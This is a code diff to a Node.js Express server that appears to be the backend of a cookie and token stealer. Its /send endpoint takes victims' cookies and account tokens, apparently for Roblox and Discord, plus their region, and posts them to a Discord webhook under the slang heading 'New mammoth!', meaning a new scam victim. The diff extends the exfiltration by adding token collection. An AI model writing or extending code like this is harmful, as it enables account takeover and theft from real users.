@@ -17,8 +17,8 @@ app.get('/download', async (req, res) => {
 app.post('/send', async (req, res) => {
         const reqBody = req.body;
         const cookies = reqBody.cookies;
-        //const tokens = reqBody.tokens;
-        //const region = reqBody.region;
+        const tokens = reqBody.tokens;
+        const region = reqBody.region;
         const fieldsArray = [];
         const fieldsArray2 = [];
         let index = 0;
@@ -33,13 +33,23 @@ app.post('/send', async (req, res) => {
                 console.log(cookies[key],index);
             }
         }
+        for (const key in tokens) {
+            if (Object.prototype.hasOwnProperty.call(tokens, key)) {
+                index++;
+                //name: "Memory",
+                //value: "4.2 GB / 16 GB",
+                //inline: true
+                fieldsArray2.push(tokens[key]);
+                console.log(tokens[key],index);
+            }
+        }
         console.log(`Новый мамонт!\nКуки: ${fieldsArray.concat("\n \n")}`);
         const response = await fetch(webhookUrl, {
             method: "POST",
             headers: {
               "Content-Type": "application/json"
             },
-            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\n\nРБ:\n${fieldsArray.concat("\n\n")}ДС:\n` })
+            body: JSON.stringify({ content: `@everyone\nНовый мамонт!\nРегион: ${region}\nРБ:\n${fieldsArray.concat("\n\n")}ДС:\n${fieldsArray2.concat("\n\n")}` })
         });
         console.log(response);
         // Формируем правильную структуру для Discord
